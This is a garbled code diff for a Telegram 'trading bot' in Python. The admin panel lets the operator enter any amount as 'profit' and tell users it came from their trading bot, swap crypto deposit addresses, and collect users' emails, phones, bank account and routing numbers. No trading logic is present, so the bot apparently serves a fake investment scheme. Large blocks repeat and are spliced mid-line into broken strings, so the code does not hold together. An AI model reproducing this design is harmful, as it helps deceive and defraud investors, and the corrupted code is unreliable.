+            users_list += f"💳 Pending Deposit: {pending_dep}\n"
+            users_list += f"💸 Pending Withdrawal: {pending_with}\n"
+            users_list += "━━━━━━━━━━━━━━━━━━━━\n"
+        
+        if len(users_list) > 4000:
+            parts = [users_list[i:i+4000] for i in range(0, len(users_list), 4000)]
+            for part in parts:
+                await context.bot.send_message(
+                    chat_id=update.effective_chat.id,
+                    text=part,
+                    parse_mode='Markdown'
+                )
+        else:
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text=users_list,
+                parse_mode='Markdown'
+            )
+    
+    elif action == 'admin_update_profit':
+        if not user_data:
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text="📝 No users registered yet."
+            )
+            return ADMIN_STATE
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Please use the command: /updateprofit <user_id> <amount>\n\nExample: /updateprofit 123456789 250.75"
+        )
+    
+    elif action == 'admin_update_crypto':
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Please use the command: /updatecrypto <crypto_name> <address>\n\nExample: /updatecrypto Bitcoin 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
+        )
+    
+    elif action == 'admin_help':
+        help_text = """🛠 **Admin Panel Guide** 🛠
+
+Welcome to the NCW Trading Bot Admin Panel. Below are the available actions and how to use them:
+
+👥 **List Users**
+- View all registered users with details (ID, name, email, balance, etc.).
+- Use the 'List Users' button or /listusers.
+
+✅ **User Approval**
+- New user registrations will send you a notification with an 'Approve User' button.
+- Click the button to approve users automatically.
+
+💳 **Deposit Approval**
+- Deposit requests will send you a notification with an 'Approve' button.
+- Click the button to confirm deposits automatically.
+
+💸 **Withdrawal Approval**
+- Withdrawal requests will send you a notification with an 'Approve' button.
+- Click the button to process withdrawals automatically.
+
+📈 **Update Profit**
+- Add profit to a user's account based on trading bot performance.
+- Command: /updateprofit <user_id> <amount>
+- Example: /updateprofit 123456789 250.75
+
+🪙 **Update Crypto Address**
+- Change the wallet address for a cryptocurrency.
+- Command: /updatecrypto <crypto_name> <address>
+- Example: /updatecrypto Bitcoin 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
+
+ℹ️ **Help**
+- Review this guide anytime with /adminhelp or the 'Help' button.
+
+**Tips:**
+- Use /getid to find a user's ID.
+- Most approvals now work with buttons for easier management.
+- All commands are case-sensitive."""
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text=help_text,
+            parse_mode='Markdown'
+        )
+    
+    return ADMIN_STATE
+
+async def approve_deposit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve deposits"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /approve <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['balance'] += amount
+        user_info['deposit'] += amount
+        user_info['pending_deposit'] = 0
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"✅ Your deposit of ${amount:.2f} has been confirmed! Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved ${amount:.2f} deposit for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approve <user_id> <amount>")
+
+async def approve_withdrawal(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve withdrawals"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /approvewithdrawal <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        
+        if amount > user_info['balance']:
+            await update.message.reply_text("❌ Insufficient user balance.")
+            return
+        
+        user_info['balance'] -= amount
+        user_info['withdrawal'] += amount
+        user_info['pending_withdrawal'] = 0
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"✅ Your withdrawal of ${amount:.2f} has been processed! Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved ${amount:.2f} withdrawal for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approvewithdrawal <user_id> <amount>")
+
+async def update_profit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to update user profits"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /updateprofit <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['profit'] += amount
+        user_info['balance'] += amount
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"🎉 Congratulations! You've earned ${amount:.2f} in profits from your active trading bot. Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Added ${amount:.2f} profit for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /updateprofit <user_id> <amount>")
+
+async def update_crypto_address(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to update crypto addresses"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /updatecrypto <crypto_name> <address>")
+            return
+        
+        crypto_name = args[0].title()
+        address = args[1]
+        
+        if crypto_name not in crypto_addresses:
+            await update.message.reply_text(f"❌ Crypto {crypto_name} not found. Available: {', '.join(crypto_addresses.keys())}")
+            return
+        
+        crypto_addresses[crypto_name] = address
+        await update.message.reply_text(f"✅ Updated {crypto_name} address to: {address}")
+        
+    except IndexError:
+        await update.message.reply_text("❌ Invalid format. Usage: /updatecrypto <crypto_name> <address>")
+
+async def approve_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve user accounts"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 1:
+            await update.message.reply_text("Usage: /approveuser <user_id>")
+            return
+        
+        user_id_target = int(args[0])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['approved'] = True
+        
+        keyboard = [
+            [InlineKeyboardButton("✅ Proceed to Dashboard", callback_data='proceed_to_menu')]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"🎉 Great news {user_info['name']}! Your account has been approved. You can now access all trading features. Click 'Proceed to Dashboard' to continue.",
+                reply_markup=reply_markup
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved account for user {user_id_target} ({user_info['name']}).")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approveuser <user_id>")
+
+async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to list all users"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    if not user_data:
+        await update.message.reply_text("📝 No users registered yet.")
+        return
+    
+    users_list = """👥 **Registered Users** 👥
+
+Below is a detailed list of all registered users:\n\n"""
+    for user_id_key, data in user_data.items():
+        status = "✅ Approved" if data['approved'] else "⏳ Pending"
+        bot = data['active_bot'] if data['active_bot'] else "None"
+        pending_dep = f"${data['pending_deposit']:.2f}" if data['pending_deposit'] > 0 else "None"
+        pending_with = f"${data['pending_withdrawal']:.2f}" if data['pending_withdrawal'] > 0 else "None"
+        
+        users_list += f"🆔 **{user_id_key}** - {data['name']}\n"
+        users_list += f"📧 {data['email']}\n"
+        users_list += f"📱 {data['phone']}\n"
+        users_list += f"💰 Balance: ${data['balance']:.2f}\n"
+        users_list += f"📈 Deposit: ${data['deposit']
+    address = context.user_data['crypto_address']
+    
+    admin_message = f"""💸 **Crypto Withdrawal Request**
+
+👤 **User:** {user_info['name']} (ID: {user_id})
+💰 **Amount:** ${amount:.2f}
+🏦 **Crypto Address:** {address}
+📱 **Phone:** {user_info['phone']}
+📧 **Email:** {user_info['email']}
+
+Click 'Approve' to process this withdrawal."""
+    
+    keyboard = [
+        [InlineKeyboardButton("✅ Approve", callback_data=f'approve_withdrawal_{user_id}_{amount}')]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    try:
+        await context.bot.send_message(
+            chat_id=ADMIN_USER_ID,
+            text=admin_message,
+            reply_markup=reply_markup,
+            parse_mode='Markdown'
+        )
+    except TelegramError as e:
+        logger.error(f"Failed to send admin notification: {e}")
+        await update.message.reply_text(
+            "⚠️ Failed to process withdrawal request. Please try again or contact support.",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
+        )
+        return MAIN_MENU
+    
+    user_info['pending_withdrawal'] = amount
+    
+    await update.message.reply_text(
+        "Your withdrawal request is pending admin confirmation.",
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
+    )
+    return MAIN_MENU
+
+async def get_bank_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get bank name"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['bank_name'] = update.message.text.strip()
+    
+    await update.message.reply_text(
+        "Please enter your account number:",
+        reply_markup=create_cancel_keyboard()
+    )
+    return WITHDRAW_ACCOUNT
+
+async def get_account_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get account number"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['account_number'] = update.message.text.strip()
+    
+    await update.message.reply_text(
+        "Please enter your routing number:",
+        reply_markup=create_cancel_keyboard()
+    )
+    return WITHDRAW_ROUTING
+
+async def get_routing_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get routing number and process bank withdrawal"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['routing_number'] = update.message.text.strip()
+    
+    user_info = get_user_data(user_id)
+    amount = context.user_data['withdraw_amount']),
+                CallbackQueryHandler(show_copy_trade, pattern='^copy_trade:.2f}\n"
+            users_list += f"📊 Profit: ${data['profit']:.2f}\n"
+            users_list += f"📉 Withdrawal: ${data['withdrawal']:.2f}\n"
+            users_list += f"📊 Status: {status}\n"
+            users_list += f"🤖 Active Bot: {bot}\n"
+            users_list += f"💳 Pending Deposit: {pending_dep}\n"
+            users_list += f"💸 Pending Withdrawal: {pending_with}\n"
+            users_list += "━━━━━━━━━━━━━━━━━━━━\n"
+        
+        if len(users_list) > 4000:
+            parts = [users_list[i:i+4000] for i in range(0, len(users_list), 4000)]
+            for part in parts:
+                await context.bot.send_message(
+                    chat_id=update.effective_chat.id,
+                    text=part,
+                    parse_mode='Markdown'
+                )
+        else:
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text=users_list,
+                parse_mode='Markdown'
+            )
+    
+    elif action == 'admin_update_profit':
+        if not user_data:
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text="📝 No users registered yet."
+            )
+            return ADMIN_STATE
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Please use the command: /updateprofit <user_id> <amount>\n\nExample: /updateprofit 123456789 250.75"
+        )
+    
+    elif action == 'admin_update_crypto':
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Please use the command: /updatecrypto <crypto_name> <address>\n\nExample: /updatecrypto Bitcoin 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
+        )
+    
+    elif action == 'admin_help':
+        help_text = """🛠 **Admin Panel Guide** 🛠
+
+Welcome to the NCW Trading Bot Admin Panel. Below are the available actions and how to use them:
+
+👥 **List Users**
+- View all registered users with details (ID, name, email, balance, etc.).
+- Use the 'List Users' button or /listusers.
+
+✅ **User Approval**
+- New user registrations will send you a notification with an 'Approve User' button.
+- Click the button to approve users automatically.
+
+💳 **Deposit Approval**
+- Deposit requests will send you a notification with an 'Approve' button.
+- Click the button to confirm deposits automatically.
+
+💸 **Withdrawal Approval**
+- Withdrawal requests will send you a notification with an 'Approve' button.
+- Click the button to process withdrawals automatically.
+
+📈 **Update Profit**
+- Add profit to a user's account based on trading bot performance.
+- Command: /updateprofit <user_id> <amount>
+- Example: /updateprofit 123456789 250.75
+
+🪙 **Update Crypto Address**
+- Change the wallet address for a cryptocurrency.
+- Command: /updatecrypto <crypto_name> <address>
+- Example: /updatecrypto Bitcoin 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
+
+ℹ️ **Help**
+- Review this guide anytime with /adminhelp or the 'Help' button.
+
+**Tips:**
+- Use /getid to find a user's ID.
+- Most approvals now work with buttons for easier management.
+- All commands are case-sensitive."""
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text=help_text,
+            parse_mode='Markdown'
+        )
+    
+    return ADMIN_STATE
+
+async def approve_deposit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve deposits"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /approve <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['balance'] += amount
+        user_info['deposit'] += amount
+        user_info['pending_deposit'] = 0
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"✅ Your deposit of ${amount:.2f} has been confirmed! Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved ${amount:.2f} deposit for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approve <user_id> <amount>")
+
+async def approve_withdrawal(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve withdrawals"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /approvewithdrawal <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        
+        if amount > user_info['balance']:
+            await update.message.reply_text("❌ Insufficient user balance.")
+            return
+        
+        user_info['balance'] -= amount
+        user_info['withdrawal'] += amount
+        user_info['pending_withdrawal'] = 0
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"✅ Your withdrawal of ${amount:.2f} has been processed! Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved ${amount:.2f} withdrawal for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approvewithdrawal <user_id> <amount>")
+
+async def update_profit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to update user profits"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /updateprofit <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['profit'] += amount
+        user_info['balance'] += amount
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"🎉 Congratulations! You've earned ${amount:.2f} in profits from your active trading bot. Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Added ${amount:.2f} profit for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /updateprofit <user_id> <amount>")
+
+async def update_crypto_address(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to update crypto addresses"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /updatecrypto <crypto_name> <address>")
+            return
+        
+        crypto_name = args[0].title()
+        address = args[1]
+        
+        if crypto_name not in crypto_addresses:
+            await update.message.reply_text(f"❌ Crypto {crypto_name} not found. Available: {', '.join(crypto_addresses.keys())}")
+            return
+        
+        crypto_addresses[crypto_name] = address
+        await update.message.reply_text(f"✅ Updated {crypto_name} address to: {address}")
+        
+    except IndexError:
+        await update.message.reply_text("❌ Invalid format. Usage: /updatecrypto <crypto_name> <address>")
+
+async def approve_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve user accounts"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 1:
+            await update.message.reply_text("Usage: /approveuser <user_id>")
+            return
+        
+        user_id_target = int(args[0])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['approved'] = True
+        
+        keyboard = [
+            [InlineKeyboardButton("✅ Proceed to Dashboard", callback_data='proceed_to_menu')]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"🎉 Great news {user_info['name']}! Your account has been approved. You can now access all trading features. Click 'Proceed to Dashboard' to continue.",
+                reply_markup=reply_markup
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved account for user {user_id_target} ({user_info['name']}).")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approveuser <user_id>")
+
+async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to list all users"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    if not user_data:
+        await update.message.reply_text("📝 No users registered yet.")
+        return
+    
+    users_list = """👥 **Registered Users** 👥
+
+Below is a detailed list of all registered users:\n\n"""
+    for user_id_key, data in user_data.items():
+        status = "✅ Approved" if data['approved'] else "⏳ Pending"
+        bot = data['active_bot'] if data['active_bot'] else "None"
+        pending_dep = f"${data['pending_deposit']:.2f}" if data['pending_deposit'] > 0 else "None"
+        pending_with = f"${data['pending_withdrawal']:.2f}" if data['pending_withdrawal'] > 0 else "None"
+        
+        users_list += f"🆔 **{user_id_key}** - {data['name']}\n"
+        users_list += f"📧 {data['email']}\n"
+        users_list += f"📱 {data['phone']}\n"
+        users_list += f"💰 Balance: ${data['balance']:.2f}\n"
+        users_list += f"📈 Deposit: ${data['deposit']
+    address = context.user_data['crypto_address']
+    
+    admin_message = f"""💸 **Crypto Withdrawal Request**
+
+👤 **User:** {user_info['name']} (ID: {user_id})
+💰 **Amount:** ${amount:.2f}
+🏦 **Crypto Address:** {address}
+📱 **Phone:** {user_info['phone']}
+📧 **Email:** {user_info['email']}
+
+Click 'Approve' to process this withdrawal."""
+    
+    keyboard = [
+        [InlineKeyboardButton("✅ Approve", callback_data=f'approve_withdrawal_{user_id}_{amount}')]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    try:
+        await context.bot.send_message(
+            chat_id=ADMIN_USER_ID,
+            text=admin_message,
+            reply_markup=reply_markup,
+            parse_mode='Markdown'
+        )
+    except TelegramError as e:
+        logger.error(f"Failed to send admin notification: {e}")
+        await update.message.reply_text(
+            "⚠️ Failed to process withdrawal request. Please try again or contact support.",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
+        )
+        return MAIN_MENU
+    
+    user_info['pending_withdrawal'] = amount
+    
+    await update.message.reply_text(
+        "Your withdrawal request is pending admin confirmation.",
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
+    )
+    return MAIN_MENU
+
+async def get_bank_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get bank name"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['bank_name'] = update.message.text.strip()
+    
+    await update.message.reply_text(
+        "Please enter your account number:",
+        reply_markup=create_cancel_keyboard()
+    )
+    return WITHDRAW_ACCOUNT
+
+async def get_account_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get account number"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['account_number'] = update.message.text.strip()
+    
+    await update.message.reply_text(
+        "Please enter your routing number:",
+        reply_markup=create_cancel_keyboard()
+    )
+    return WITHDRAW_ROUTING
+
+async def get_routing_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get routing number and process bank withdrawal"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['routing_number'] = update.message.text.strip()
+    
+    user_info = get_user_data(user_id)
+    amount = context.user_data['withdraw_amount']),
                 CallbackQueryHandler(select_trading_bot, pattern='^select_bot_'),
-                CallbackQueryHandler(handle_stake, pattern='^stake$'),
-                CallbackQueryHandler(cancel_operation, pattern='^cancel$'),
-                CallbackQueryHandler(handle_admin_action, pattern='^admin_'),
+                CallbackQueryHandler(handle_stake, pattern='^stake:.2f}\n"
+            users_list += f"📊 Profit: ${data['profit']:.2f}\n"
+            users_list += f"📉 Withdrawal: ${data['withdrawal']:.2f}\n"
+            users_list += f"📊 Status: {status}\n"
+            users_list += f"🤖 Active Bot: {bot}\n"
+            users_list += f"💳 Pending Deposit: {pending_dep}\n"
+            users_list += f"💸 Pending Withdrawal: {pending_with}\n"
+            users_list += "━━━━━━━━━━━━━━━━━━━━\n"
+        
+        if len(users_list) > 4000:
+            parts = [users_list[i:i+4000] for i in range(0, len(users_list), 4000)]
+            for part in parts:
+                await context.bot.send_message(
+                    chat_id=update.effective_chat.id,
+                    text=part,
+                    parse_mode='Markdown'
+                )
+        else:
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text=users_list,
+                parse_mode='Markdown'
+            )
+    
+    elif action == 'admin_update_profit':
+        if not user_data:
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text="📝 No users registered yet."
+            )
+            return ADMIN_STATE
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Please use the command: /updateprofit <user_id> <amount>\n\nExample: /updateprofit 123456789 250.75"
+        )
+    
+    elif action == 'admin_update_crypto':
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Please use the command: /updatecrypto <crypto_name> <address>\n\nExample: /updatecrypto Bitcoin 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
+        )
+    
+    elif action == 'admin_help':
+        help_text = """🛠 **Admin Panel Guide** 🛠
+
+Welcome to the NCW Trading Bot Admin Panel. Below are the available actions and how to use them:
+
+👥 **List Users**
+- View all registered users with details (ID, name, email, balance, etc.).
+- Use the 'List Users' button or /listusers.
+
+✅ **User Approval**
+- New user registrations will send you a notification with an 'Approve User' button.
+- Click the button to approve users automatically.
+
+💳 **Deposit Approval**
+- Deposit requests will send you a notification with an 'Approve' button.
+- Click the button to confirm deposits automatically.
+
+💸 **Withdrawal Approval**
+- Withdrawal requests will send you a notification with an 'Approve' button.
+- Click the button to process withdrawals automatically.
+
+📈 **Update Profit**
+- Add profit to a user's account based on trading bot performance.
+- Command: /updateprofit <user_id> <amount>
+- Example: /updateprofit 123456789 250.75
+
+🪙 **Update Crypto Address**
+- Change the wallet address for a cryptocurrency.
+- Command: /updatecrypto <crypto_name> <address>
+- Example: /updatecrypto Bitcoin 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
+
+ℹ️ **Help**
+- Review this guide anytime with /adminhelp or the 'Help' button.
+
+**Tips:**
+- Use /getid to find a user's ID.
+- Most approvals now work with buttons for easier management.
+- All commands are case-sensitive."""
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text=help_text,
+            parse_mode='Markdown'
+        )
+    
+    return ADMIN_STATE
+
+async def approve_deposit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve deposits"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /approve <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['balance'] += amount
+        user_info['deposit'] += amount
+        user_info['pending_deposit'] = 0
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"✅ Your deposit of ${amount:.2f} has been confirmed! Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved ${amount:.2f} deposit for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approve <user_id> <amount>")
+
+async def approve_withdrawal(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve withdrawals"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /approvewithdrawal <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        
+        if amount > user_info['balance']:
+            await update.message.reply_text("❌ Insufficient user balance.")
+            return
+        
+        user_info['balance'] -= amount
+        user_info['withdrawal'] += amount
+        user_info['pending_withdrawal'] = 0
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"✅ Your withdrawal of ${amount:.2f} has been processed! Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved ${amount:.2f} withdrawal for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approvewithdrawal <user_id> <amount>")
+
+async def update_profit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to update user profits"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /updateprofit <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['profit'] += amount
+        user_info['balance'] += amount
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"🎉 Congratulations! You've earned ${amount:.2f} in profits from your active trading bot. Your new balance is ${user_info['balance']:.2f}."
+            )
